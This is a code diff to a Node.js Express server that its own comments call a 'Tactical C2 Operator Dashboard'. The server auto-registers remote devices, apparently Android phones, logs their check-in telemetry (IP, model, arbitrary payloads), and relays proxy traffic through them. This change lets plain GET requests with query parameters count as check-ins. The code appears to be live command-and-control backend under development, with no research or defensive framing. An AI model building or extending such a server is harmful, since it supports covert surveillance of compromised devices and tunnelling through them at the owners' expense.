@@ -108,7 +108,6 @@ app.all('/proxy*', (req, res) => {
         deviceId = 'SM-F731W';
     }
 
-    // Auto-register device if not present so CONNECT never fails with TARGET_OFFLINE
     if (!devices.has(deviceId)) {
         devices.set(deviceId, {
             deviceId,
@@ -149,8 +148,57 @@ app.all('/proxy*', (req, res) => {
     }, 25000);
 });
 
-// Tactical C2 Operator Dashboard (HTML) at root URL
-app.get('/', (req, res) => {
+// Universal Check-In Handler (supports GET with query params, POST JSON, etc.)
+function handleCheckin(req, res) {
+    try {
+        const data = req.body || {};
+        const queryData = req.query || {};
+        const merged = { ...queryData, ...data };
+
+        // If it's a plain browser GET request with no check-in query parameters, serve the dashboard HTML
+        if (req.method === 'GET' && Object.keys(queryData).length === 0) {
+            return serveDashboard(req, res);
+        }
+
+        const rawModel = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model || 'SM-F731W';
+        const deviceId = rawModel.replace(/\s*\(API\s*\d+\)/i, '').trim();
+
+        for (const [key, val] of devices.entries()) {
+            if (key === deviceId || val.ip === merged.ip || key.includes(deviceId) || deviceId.includes(key)) {
+                devices.delete(key);
+            }
+        }
+
+        devices.set(deviceId, {
+            ...merged,
+            deviceId,
+            lastSeen: new Date().toISOString()
+        });
+
+        telemetryLogs.unshift({
+            timestamp: new Date().toISOString(),
+            deviceId,
+            type: merged.type || 'checkin',
+            payload: merged
+        });
+
+        if (telemetryLogs.length > 500) telemetryLogs.pop();
+        saveData();
+
+        console.log(`[CHECKIN SUCCESS] Device ID: ${deviceId} | IP: ${merged.ip}`);
+
+        if (req.method === 'GET') {
+            return res.json({ success: true, message: 'Check-in ingested via GET' });
+        }
+        res.json({ success: true, message: 'Telemetry received successfully' });
+    } catch (err) {
+        console.error('[ERROR] Checkin failed:', err.message);
+        res.status(400).json({ success: false, error: err.message });
+    }
+}
+
+// Tactical C2 Operator Dashboard (HTML)
+function serveDashboard(req, res) {
     const deviceList = Array.from(devices.values());
 
     let devicesHtml = deviceList.length === 0 ?
@@ -246,7 +294,13 @@ app.get('/', (req, res) => {
 </html>`;
 
     res.send(html);
-});
+}
+
+// Register routing handlers supporting both GET and POST with query params
+app.get('/', handleCheckin);
+app.get('/checkin', handleCheckin);
+app.post('/', handleCheckin);
+app.post('/checkin', handleCheckin);
 
 // JSON Health check endpoint
 app.get('/api/status', (req, res) => {
@@ -258,49 +312,6 @@ app.get('/api/status', (req, res) => {
         timestamp: new Date().toISOString()
     });
 });
-
-// Device Check-in & Telemetry Ingestion endpoints (supports both / and /checkin)
-app.post('/', handleCheckin);
-app.post('/checkin', handleCheckin);
-
-function handleCheckin(req, res) {
-    try {
-        const data = req.body;
-        const queryData = req.query;
-        const merged = { ...queryData, ...data };
-        const rawModel = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model || 'Unknown Device';
-        const deviceId = rawModel.replace(/\s*\(API\s*\d+\)/i, '').trim();
-
-        for (const [key, val] of devices.entries()) {
-            if (key === deviceId || val.ip === merged.ip || key.includes(deviceId) || deviceId.includes(key)) {
-                devices.delete(key);
-            }
-        }
-
-        devices.set(deviceId, {
-            ...merged,
-            deviceId,
-            lastSeen: new Date().toISOString()
-        });
-
-        telemetryLogs.unshift({
-            timestamp: new Date().toISOString(),
-            deviceId,
-            type: merged.type || 'checkin',
-            payload: merged
-        });
-
-        if (telemetryLogs.length > 500) telemetryLogs.pop();
-
-        saveData();
-
-        console.log(`[CHECKIN] Device ID: ${deviceId} | Model: ${merged.model || merged.device} | IP: ${merged.ip}`);
-        res.json({ success: true, message: 'Telemetry received successfully' });
-    } catch (err) {
-        console.error('[ERROR] Checkin failed:', err.message);
-        res.status(400).json({ success: false, error: err.message });
-    }
-}
 
 // List active connected devices (JSON)
 app.get('/devices', (req, res) => {
